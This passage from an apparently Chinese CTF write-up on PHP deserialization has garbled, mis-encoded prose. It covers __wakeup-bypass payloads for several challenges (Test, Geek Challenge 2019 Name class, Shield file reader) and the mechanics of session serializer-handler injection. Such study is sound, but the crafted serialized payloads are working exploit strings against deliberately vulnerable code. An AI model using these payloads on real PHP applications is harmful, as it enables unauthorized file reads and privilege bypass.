<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;key))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;key == <span class="hljs-string">&#x27;flag&#x27;</span>)<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;you failed 23333&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;key;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>]))&#123;<br>        show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$answer</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$answer</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br><span class="hljs-comment">//__destructå·²ç»èµ‹å€¼$key=flag è€Œ__wakeupåˆæŠŠå˜é‡ç»™è¦†ç›–</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125; ç»•è¿‡__wakeup</span><br></code></pre></td></tr></table></figure>

<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜ 2019 PHP"></a>æå®¢å¤§æŒ‘æˆ˜ 2019 PHP</h4><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ„é€ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Name();<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//æ‰‹åŠ¨ä¿®æ”¹ç‰¹æ®Šå­—ç¬¦ä»¥åŠç»•è¿‡__Wakeup()</span><br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br><br><br><span class="hljs-comment">//æœ‰æ—¶æ˜¯urlçš„getä¼ å‚ é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨urlç¼–ç  çœå»ä¿®æ”¹ç‰¹æ®Šå­—ç¬¦çš„æ“ä½œ</span><br><span class="hljs-comment">//$a = str_replace(2,3,$a);</span><br><span class="hljs-comment">//var_dump(urlencode($a));</span><br></code></pre></td></tr></table></figure>

<h4 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h4><p>æŸ¥çœ‹å›¾ç‰‡å…ƒç´ å¾—åˆ°<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p>
<p>img åé¢çš„çŒœæ˜¯ base64 è§£ç åæ˜¯ shield.jpg</p>
<p>ä¸æ–­æ”¹å˜ base64 çš„å€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//showimg.php</span><br><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$f</span>)) &#123;<br>		<span class="hljs-variable">$f</span> = base64_decode(<span class="hljs-variable">$f</span>);<br>		<span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)===<span class="hljs-literal">FALSE</span><br>		&amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;pctf&#x27;</span>)===<span class="hljs-literal">FALSE</span>) &#123;<br>			readfile(<span class="hljs-variable">$f</span>);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>		&#125;<br>	&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;shield.php&#x27;</span>;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br>        <span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$g</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span> - readfile();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shield.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç›´æ¥è¿™æ ·è¯»å– pctf.php è¿”å› file not found</p>
<p>æ„é€ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Shield(pctf.php);<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>index.php?class=O:6:â€Shieldâ€:1:{s:4:â€fileâ€;s:8:â€pctf.phpâ€;}</p>
</blockquote>
<h2 id="PHP-session-ååºåˆ—åŒ–"><a href="#PHP-session-ååºåˆ—åŒ–" class="headerlink" title="PHP session ååºåˆ—åŒ–"></a>PHP session ååºåˆ—åŒ–</h2><blockquote>
<p>å½“ session_start()è¢«è°ƒç”¨æˆ–è€… php.ini ä¸­ session.auto_start = 1 æ—¶ï¼ŒPHP å†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œå°†ç”¨æˆ· session åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º/tmpï¼‰</p>
</blockquote>
<h3 id="å¤„ç†å™¨"><a href="#å¤„ç†å™¨" class="headerlink" title="å¤„ç†å™¨"></a>å¤„ç†å™¨</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/10/.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="ini-ä¸­ç›¸å…³çš„é…ç½®"><a href="#ini-ä¸­ç›¸å…³çš„é…ç½®" class="headerlink" title="ini ä¸­ç›¸å…³çš„é…ç½®"></a>ini ä¸­ç›¸å…³çš„é…ç½®</h3><p>é…ç½®æ–‡ä»¶ php.ini ä¸­å«æœ‰ session çš„ç›¸å…³é…ç½®</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„,é»˜è®¤åœ¨/tmp</span><br><span class="hljs-keyword">session</span>.auto_start   <span class="hljs-comment">--æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨</span><br><span class="hljs-keyword">session</span>.serialize_handler   <span class="hljs-comment">--å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨phpsession.save_handler=&quot;&quot; --è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)ï¼Œæ¯”å¦‚fileså°±æ˜¯sessioné»˜è®¤ä»¥æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œå­˜å‚¨</span><br></code></pre></td></tr></table></figure>

<h3 id="ä»£ç ä¸­å¼•æ“è®¾ç½®"><a href="#ä»£ç ä¸­å¼•æ“è®¾ç½®" class="headerlink" title="ä»£ç ä¸­å¼•æ“è®¾ç½®"></a>ä»£ç ä¸­å¼•æ“è®¾ç½®</h3><p>åœ¨ PHP ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯ PHP å¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç </p>
<p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br></code></pre></td></tr></table></figure>

<h3 id="ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚"><a href="#ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚" class="headerlink" title="ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚"></a>ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚</h3><p>php ä¸­çš„ session å†…å®¹æ˜¯ä»¥<strong>æ–‡ä»¶</strong>æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œç”±<code>session.save_handler</code>æ¥å†³å®šã€‚æ–‡ä»¶åç”±<code>sess_sessionid</code>å‘½åï¼Œæ–‡ä»¶å†…å®¹åˆ™ä¸º session åºåˆ—åŒ–åçš„å€¼ï¼Œæ–‡ä»¶ä½ç½®åœ¨ ini çš„<code>session.save_path</code>ä¸­ <strong>phpstudy æœ¬åœ°ä½ç½®ï¼š/Extensions/tmp/tmp</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>å½“<code>session.serialize_handler</code>ä¸º<code>php</code>æ—¶</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li>å½“<code>session.serialize_handler</code>ä¸º<code>php_serialize</code>æ—¶</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>å½“<code>session.serialize_handler</code>ä¸º<code>php_binary</code>æ—¶</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-number">0x04</span>&gt;names:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure>

<h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>PHP ä¸­çš„ Session çš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„ Session ä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚å¦‚æœ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ $_SESSION æ•°æ®æ—¶çš„ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šçš„æ„é€ ï¼Œç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ã€‚å¸¸è§çš„æ¯”å¦‚å­˜å…¥ session æ—¶ç”¨çš„å¤„ç†å™¨ä¸º php_serialize,ååºåˆ—åŒ–æ—¶ç”¨çš„å¤„ç†å™¨æ˜¯ php</p>
<p><strong>php å¤§äº 5.5.4 çš„ç‰ˆæœ¬ä¸­é»˜è®¤ä½¿ç”¨ php_serialize è§„åˆ™</strong></p>
<p>å¸¸è§çš„æ¯”å¦‚å­˜å…¥ session æ—¶ç”¨çš„å¤„ç†å™¨ä¸º php_serializeï¼Œååºåˆ—åŒ–æ—¶ç”¨çš„å¤„ç†å™¨æ˜¯ php</p>
<blockquote>
<p>å½“é…ç½®é€‰é¡¹ session.auto_start ï¼ Offï¼Œä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜</p>
<p>å½“é…ç½®é€‰é¡¹ session.auto_start ï¼ On ä¼šè‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨è„šæœ¬ä»£ç æ‰§è¡Œå‰ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®šçš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› æ­¤ä¸€äº›éœ€è¦åœ¨è„šæœ¬ä¸­è®¾ç½®åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åºä¼šåœ¨ session.auto_start ï¼ On æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼šè¯ï¼Œç„¶åè®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œå†è°ƒç”¨ session_start()å‡½æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶å¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜,å› ä¸º PHP è‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯æ˜¯åœ¨è„šæœ¬æ‰§è¡Œå‰ï¼Œæ‰€ä»¥é€šè¿‡è¯¥æ–¹å¼åªèƒ½æ³¨å…¥ PHP çš„å†…ç½®ç±»</p>
</blockquote>
<p>æ¯”å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„$_SESSION æ•°æ® åœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º php_serialize å­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ryat&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span><span class="hljs-built_in">stdClass</span><span class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ php_serialize è€Œæ˜¯ php çš„è¯ é‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š</p>
